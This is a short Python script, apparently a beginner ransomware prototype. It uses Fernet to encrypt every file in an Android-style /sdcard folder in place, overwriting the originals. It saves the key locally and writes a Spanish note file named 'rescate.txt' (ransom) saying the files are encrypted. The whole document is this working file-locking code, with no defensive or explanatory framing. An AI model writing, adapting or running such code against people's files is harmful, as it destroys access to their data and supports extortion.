from cryptography.fernet import Fernet
import os


def negerate_key():
    key = Fernet.generate_key()
    with open("key.key","wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key","rb").read()


def encrypt(items,key):
    f = Fernet(key)
    for item in items:
        with open(item,"rb") as file:
            file_data = file.read()
        encrypt_data = f.encrypt(file_data)
        with open(item,"wb") as file:
            file.write(encrypt_data)
if __name__ == "__main__":
    path_to_encrypt = "/sdcard/example"
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt+"/"+item for item in items]
    negerate_key()
    key = load_key()
    encrypt(full_path,key)
    with open(path_to_encrypt+"rescate.txt","w") as d:
        d.write("Archivos encriotados ")
